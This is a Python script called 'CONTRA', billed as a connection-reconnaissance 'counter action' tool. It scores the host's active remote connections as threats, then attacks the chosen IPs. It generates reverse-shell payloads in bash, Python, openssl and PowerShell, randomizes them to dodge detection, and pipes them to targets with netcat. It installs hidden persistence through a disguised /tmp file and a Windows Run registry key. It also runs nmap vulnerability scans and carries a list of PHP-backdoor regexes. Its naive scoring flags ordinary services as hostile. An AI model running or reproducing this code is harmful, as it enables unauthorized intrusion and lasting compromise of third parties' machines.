#!/usr/bin/env python3
import os
import re
import sys
import time
import socket
import random
import subprocess
import ipaddress
import threading
import configparser
from datetime import datetime
from collections import deque

# Enhanced color system
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Global configuration
DISPLAY = ":0"
LISTENER_PORT = random.randint(10000, 65535)
PROXY_CHAINS_CONF = "/etc/proxychains.conf"
TOR_PROXIES_URL = "https://raw.githubusercontent.com/TheTorProject/gettor/main/cloud/relays"
VPN_PROVIDERS = ["vpn.express", "nordvpn.com", "expressvpn.com", "protonvpn.com"]
POLYMORPHIC_PAYLOADS = []
KNOWN_BACKDOORS = []
ROUTE_CACHE = deque(maxlen=100)
DNS_CACHE = {}
THREAT_SCORE = {}

# Initialize threat database
def init_threat_db():
    global KNOWN_BACKDOORS
    KNOWN_BACKDOORS = [
        r'eval\(base64_decode\(',
        r'exec\(.*?\)',
        r'passthru\(.*?\)',
        r'system\(.*?\)',
        r'`.*?`',
        r'popen\(.*?\)',
        r'proc_open\(.*?\)',
        r'pcntl_exec\(.*?\)',
        r'assert\(.*?\)',
        r'create_function\(.*?\)',
        r'register_shutdown_function\(.*?\)',
        r'register_tick_function\(.*?\)',
        r'ReflectionFunction',
        r'SoapClient\(.*?\)',
        r'SimpleXMLElement\(.*?\)',
        r'DOMDocument\(.*?\)',
        r'preg_replace\(.*?/e.*?\)',
        r'str_rot13\(.*?\)',
        r'gzuncompress\(.*?\)',
        r'gzinflate\(.*?\)',
        r'base64_decode\(.*?\)',
        r'file_get_contents\("php://input"\)',
        r'assert_options\(ASSERT_CALLBACK\)',
        r'setcookie\(.*?\)\s*?\n\s*?header\(',
        r'error_reporting\(0\)',
        r'ini_set\("display_errors", 0\)',
        r'chmod\s*\(.*?0777.*?\)'
    ]

# Enhanced polymorphic payload generator
def generate_polymorphic_payloads(lhost, lport):
    payloads = []
    # Bash payloads
    payloads.extend([
        f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        f"bash -c '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196'",
        f"bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done'"
    ])
    
    # Python payloads
    payloads.extend([
        f"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        f"python3 -c 'import socket,os;os.dup2(socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect((\"{lhost}\",{lport})),0);os.dup2(0,1);os.dup2(0,2);os.system(\"/bin/sh\")'"
    ])
    
    # Encrypted payloads
    payloads.extend([
        f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
        f"openssl s_client -quiet -connect {lhost}:{lport} | /bin/bash 2>&1 | openssl s_client -quiet -connect {lhost}:{lport}"
    ])
    
    # Windows payloads
    payloads.extend([
        f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        f"powershell -c \"$LHOST='{lhost}';$LPORT={lport};$TCPClient=New-Object Net.Sockets.TCPClient($LHOST,$LPORT);$NetworkStream=$TCPClient.GetStream();$StreamReader=New-Object IO.StreamReader($NetworkStream);$StreamWriter=New-Object IO.StreamWriter($NetworkStream);$StreamWriter.AutoFlush=$true;$Buffer=New-Object System.Byte[] 1024;while($true){{$StreamWriter.Write('PS ' + (Get-Location).Path + '> ');$Command=$StreamReader.ReadLine();$Output=iex $Command 2>&1 | Out-String;$StreamWriter.Write($Output)}}\""
    ])
    
    # Polymorphic variations
    polymorphic = []
    for payload in payloads:
        # Add random comments
        comments = ["", "# ", " # ", "   # ", " # bypass", " # security"]
        polymorphic.append(random.choice(comments) + payload)
        
        # Add random whitespace
        polymorphic.append(re.sub(r'\s+', lambda m: m.group(0) + ' ' * random.randint(0, 3), payload))
        
        # Add random casing
        polymorphic.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
    
    return polymorphic

# Enhanced threat assessment
def assess_threat(conn):
    ip = conn["remote_ip"]
    port = conn["remote_port"]
    proc = conn["proc"]
    
    # Initialize threat score
    threat_score = 0
    
    # Known malicious ports
    malicious_ports = [22, 23, 445, 3389, 5900, 6379, 27017, 1433, 3306]
    if port in malicious_ports:
        threat_score += 30
        conn["threat"] = f"{Colors.RED}[HIGH RISK]{Colors.RESET}"
    
    # Known malicious processes
    malicious_procs = ["sshd", "telnetd", "smbd", "xrdp", "vnc", "redis", "mongod"]
    if proc in malicious_procs:
        threat_score += 20
        conn["threat"] = f"{Colors.RED}[SERVICE EXPLOIT]{Colors.RESET}"
    
    # Private vs public IP
    if ipaddress.ip_address(ip).is_private:
        conn["location"] = f"{Colors.YELLOW}[PRIVATE NETWORK]{Colors.RESET}"
        threat_score += 10
    else:
        conn["location"] = f"{Colors.BLUE}[PUBLIC INTERNET]{Colors.RESET}"
        threat_score += 20
    
    # Update global threat score
    THREAT_SCORE[ip] = threat_score
    conn["threat_score"] = threat_score
    
    # Classification
    if threat_score >= 40:
        conn["classification"] = f"{Colors.RED}[UNAUTHORIZED ACCESS]{Colors.RESET}"
    elif threat_score >= 20:
        conn["classification"] = f"{Colors.YELLOW}[SUSPICIOUS ACTIVITY]{Colors.RESET}"
    else:
        conn["classification"] = f"{Colors.GREEN}[NORMAL INTERNET]{Colors.RESET}"
    
    return conn

# Autonomous traceroute with multiple options
def autonomous_traceroute(ip):
    print(f"\n{Colors.CYAN}Starting autonomous traceroute to {ip}{Colors.RESET}")
    
    # Standard traceroute
    print(f"{Colors.YELLOW}[1/6] Standard traceroute{Colors.RESET}")
    os.system(f"xterm -display {DISPLAY} -T 'TRACEROUTE: {ip}' -e 'traceroute {ip}; sleep 10' &")
    time.sleep(2)
    
    # System DNS traceroute
    print(f"{Colors.YELLOW}[2/6] Using system DNS{Colors.RESET}")
    os.system(f"xterm -display {DISPLAY} -T 'TRACEROUTE (System DNS): {ip}' -e 'traceroute --system-dns {ip}; sleep 10' &")
    time.sleep(2)
    
    # ProxyChains traceroute
    print(f"{Colors.YELLOW}[3/6] ProxyChains traceroute{Colors.RESET}")
    os.system(f"xterm -display {DISPLAY} -T 'TRACEROUTE (ProxyChains): {ip}' -e 'proxychains traceroute {ip}; sleep 10' &")
    time.sleep(2)
    
    # VPN endpoint traceroute
    print(f"{Colors.YELLOW}[4/6] VPN endpoint traceroute{Colors.RESET}")
    for vpn in VPN_PROVIDERS:
        os.system(f"xterm -display {DISPLAY} -T 'TRACEROUTE (VPN): {vpn}' -e 'traceroute {vpn}; sleep 5' &")
        time.sleep(1)
    
    # Tor network traceroute
    print(f"{Colors.YELLOW}[5/6] Tor network traceroute{Colors.RESET}")
    os.system(f"xterm -display {DISPLAY} -T 'TRACEROUTE (Tor)' -e 'proxychains traceroute torproject.org; sleep 10' &")
    time.sleep(2)
    
    # Full scan with DNS resolution
    print(f"{Colors.YELLOW}[6/6] Full DNS resolution{Colors.RESET}")
    os.system(f"xterm -display {DISPLAY} -T 'DNS RESOLUTION: {ip}' -e 'dig +trace {ip}; sleep 15' &")

# Advanced persistence mechanisms
def deploy_persistence(ip, port):
    print(f"\n{Colors.RED}DEPLOYING PERSISTENCE MECHANISMS TO {ip}:{port}{Colors.RESET}")
    
    # Linux persistence
    linux_payload = f"""echo '#!/bin/bash
while true; do
    lhost=$(hostname -I | awk '{{print $1}}')
    lport=$((10000 + RANDOM % 55536))
    bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1" &
    sleep 600
    pkill -f "bash -i >&"
    sleep $((RANDOM % 300))
done' > /tmp/.systemd-cache
chmod +x /tmp/.systemd-cache
/tmp/.systemd-cache & disown
"""
    
    # Windows persistence
    win_payload = f"""echo Set oShell = CreateObject("WScript.Shell") > %TEMP%\\syscache.vbs
echo oShell.Run "cmd /c powershell -c \\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\"", 0, True >> %TEMP%\\syscache.vbs
echo Set oShell = Nothing >> %TEMP%\\syscache.vbs
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemCache /t REG_SZ /d "%TEMP%\\syscache.vbs" /f
start %TEMP%\\syscache.vbs
"""
    
    # Deploy based on threat level
    if THREAT_SCORE.get(ip, 0) >= 40:
        print(f"{Colors.RED}[!] Deploying advanced persistence to {ip}{Colors.RESET}")
        os.system(f"xterm -display {DISPLAY} -T 'PERSISTENCE: {ip}' -e 'echo \"{linux_payload}\" | nc {ip} {port}' &")
        os.system(f"xterm -display {DISPLAY} -T 'WIN PERSISTENCE: {ip}' -e 'echo \"{win_payload}\" | nc {ip} {port}' &")
    else:
        print(f"{Colors.YELLOW}[*] Monitoring only for {ip}{Colors.RESET}")

# Enhanced connection monitoring
def get_connections():
    conns = []
    try:
        # Use ss for active connections
        ss_output = subprocess.check_output(
            ["ss", "-ntup"], 
            text=True, 
            stderr=subprocess.DEVNULL
        )
        
        # Parse ss output
        for line in ss_output.splitlines():
            if "ESTAB" not in line or "pid" not in line:
                continue
                
            parts = re.split(r'\s+', line.strip())
            if len(parts) < 7:
                continue
                
            # Extract connection info
            net = parts[4]
            remote = parts[5]
            pid_info = parts[6]
            
            # Parse PID
            pid_match = re.search(r'pid=(\d+)', pid_info)
            if not pid_match:
                continue
            pid = pid_match.group(1)
            
            # Get process info
            try:
                ps_output = subprocess.check_output(
                    ["ps", "-p", pid, "-o", "comm=,tty="],
                    text=True
                ).strip()
                proc, tty = (ps_output.split() + ["?", "?"])[:2]
            except:
                proc, tty = "unknown", "?"
            
            # Extract IP and port
            remote_ip = remote.split(":")[0]
            remote_port = remote.split(":")[-1]
            
            conn = {
                "pid": pid,
                "proc": proc,
                "tty": tty,
                "remote_ip": remote_ip,
                "remote_port": remote_port,
                "timestamp": datetime.now().strftime("%H:%M:%S")
            }
            
            # Assess threat level
            conn = assess_threat(conn)
            conns.append(conn)
            
    except Exception as e:
        print(f"{Colors.RED}Connection monitoring error: {e}{Colors.RESET}")
    
    return conns

# Display connections with enhanced info
def display_connections(connections):
    print(f"\n{Colors.HEADER}Active Remote Connections ({len(connections)}){Colors.RESET}")
    print(f"{Colors.BOLD}{'Index':<6}{'Process':<20}{'TTY':<8}{'Remote Address':<25}{'Threat':<25}{'Classification':<30}{'Timestamp'}{Colors.RESET}")
    print("-" * 120)
    
    for i, conn in enumerate(connections, 1):
        addr = f"{conn['remote_ip']}:{conn['remote_port']}"
        print(f"{i:<6}{conn['proc']:<20}{conn['tty']:<8}{addr:<25}{conn.get('threat', ''):<25}{conn.get('classification', ''):<30}{conn['timestamp']}")

# Autonomous reverse shell testing
def autonomous_shell_test(ip, port):
    print(f"\n{Colors.RED}INITIATING AUTONOMOUS EXPLOITATION SEQUENCE{Colors.RESET}")
    
    # Run initial scans in background
    threading.Thread(target=autonomous_traceroute, args=(ip,)).start()
    threading.Thread(target=run_advanced_scan, args=(ip,)).start()
    
    # Generate payloads
    local_ip = get_local_ip()
    payloads = generate_polymorphic_payloads(local_ip, LISTENER_PORT)
    random.shuffle(payloads)
    
    # Start listener
    os.system(f"xterm -display {DISPLAY} -T 'LISTENER: {LISTENER_PORT}' -e 'nc -lnvp {LISTENER_PORT}' &")
    
    # Test payloads
    print(f"{Colors.CYAN}Testing {len(payloads)} polymorphic payloads...{Colors.RESET}")
    for i, payload in enumerate(payloads):
        print(f"{Colors.YELLOW}[{i+1}/{len(payloads)}] Testing: {payload[:80]}...{Colors.RESET}")
        try:
            subprocess.Popen(
                f"echo '{payload}' | nc {ip} {port}",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            
            # Check if listener received connection
            listener_check = subprocess.check_output(
                f"netstat -tulpn | grep {LISTENER_PORT} | grep ESTABLISHED",
                shell=True,
                text=True
            )
            if listener_check:
                print(f"{Colors.GREEN}SUCCESS! Payload {i+1} established connection{Colors.RESET}")
                deploy_persistence(ip, port)
                return True
                
        except Exception as e:
            print(f"{Colors.RED}Payload test failed: {e}{Colors.RESET}")
    
    print(f"{Colors.RED}All payloads failed. Activating fallback mechanisms...{Colors.RESET}")
    deploy_persistence(ip, port)
    return False

# Advanced scanning
def run_advanced_scan(ip):
    print(f"\n{Colors.CYAN}Starting comprehensive scan of {ip}{Colors.RESET}")
    
    # Full TCP scan
    os.system(f"xterm -display {DISPLAY} -T 'NMAP TCP: {ip}' -e 'nmap -p- -T4 -v {ip}; sleep 30' &")
    
    # UDP scan
    os.system(f"xterm -display {DISPLAY} -T 'NMAP UDP: {ip}' -e 'nmap -sU -T4 -v {ip}; sleep 30' &")
    
    # Vulnerability scan
    os.system(f"xterm -display {DISPLAY} -T 'VULN SCAN: {ip}' -e 'nmap --script vuln {ip}; sleep 30' &")
    
    # OS detection
    os.system(f"xterm -display {DISPLAY} -T 'OS DETECT: {ip}' -e 'nmap -O {ip}; sleep 30' &")
    
    # Service detection
    os.system(f"xterm -display {DISPLAY} -T 'SERVICE DETECT: {ip}' -e 'nmap -sV {ip}; sleep 30' &")

# Get local IP
def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

# Main menu
def main_menu():
    connections = []
    current_host = None
    
    while True:
        print(f"\n{Colors.HEADER}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}----====<[ C O N T R A ]>====----")
        print(f"Remote connection reconnaissance tracehound and counter action.{Colors.RESET}")
        print(f"Contact: Using force to take the situation under control.")
        print(f"{Colors.HEADER}{'='*60}{Colors.RESET}")
        print("1. Scan active connections")
        print("2. Autonomous exploitation")
        print("3. Deploy persistence")
        print("4. Advanced traceroute")
        print("5. Comprehensive network scan")
        print("6. Exit")
        
        try:
            choice = input(f"{Colors.GREEN}Select option:{Colors.RESET} ").strip()
            
            if choice == "1":
                connections = get_connections()
                display_connections(connections)
                
                # Auto-select high-threat targets
                high_threat = [c for c in connections if c.get('threat_score', 0) >= 40]
                if high_threat:
                    current_host = high_threat[0]['remote_ip']
                    print(f"{Colors.RED}AUTO-SELECTED HIGH-THREAT TARGET: {current_host}{Colors.RESET}")
            
            elif choice == "2":
                if not connections:
                    print(f"{Colors.RED}Scan connections first!{Colors.RESET}")
                    continue
                    
                display_connections(connections)
                try:
                    idx = int(input(f"{Colors.YELLOW}Select connection (1-{len(connections)}):{Colors.RESET} ")) - 1
                    if 0 <= idx < len(connections):
                        target = connections[idx]
                        current_host = target['remote_ip']
                        port = target['remote_port']
                        print(f"{Colors.GREEN}Targeting {current_host}:{port}{Colors.RESET}")
                        autonomous_shell_test(current_host, port)
                    else:
                        print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                except ValueError:
                    print(f"{Colors.RED}Enter a valid number{Colors.RESET}")
            
            elif choice == "3":
                if not current_host:
                    print(f"{Colors.RED}Select target first!{Colors.RESET}")
                    continue
                deploy_persistence(current_host, random.randint(10000, 65535))
            
            elif choice == "4":
                if not current_host:
                    print(f"{Colors.RED}Select target first!{Colors.RESET}")
                    continue
                autonomous_traceroute(current_host)
            
            elif choice == "5":
                if not current_host:
                    print(f"{Colors.RED}Select target first!{Colors.RESET}")
                    continue
                run_advanced_scan(current_host)
            
            elif choice == "6":
                print("Exiting...")
                break
            
            else:
                print(f"{Colors.RED}Invalid choice{Colors.RESET}")
                
        except KeyboardInterrupt:
            print("\nOperation cancelled")
        except Exception as e:
            print(f"{Colors.RED}Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    init_threat_db()
    
    if os.geteuid() != 0:
        print(f"{Colors.RED}ERROR: Must run as root!{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}{Colors.BOLD}Starting Advanced Reconnaissance System{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] This tool performs aggressive network operations{Colors.RESET}")
    print(f"{Colors.RED}[DISCLAIMER] Use only on networks you have explicit permission to scan{Colors.RESET}")
    
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nTerminated by user")
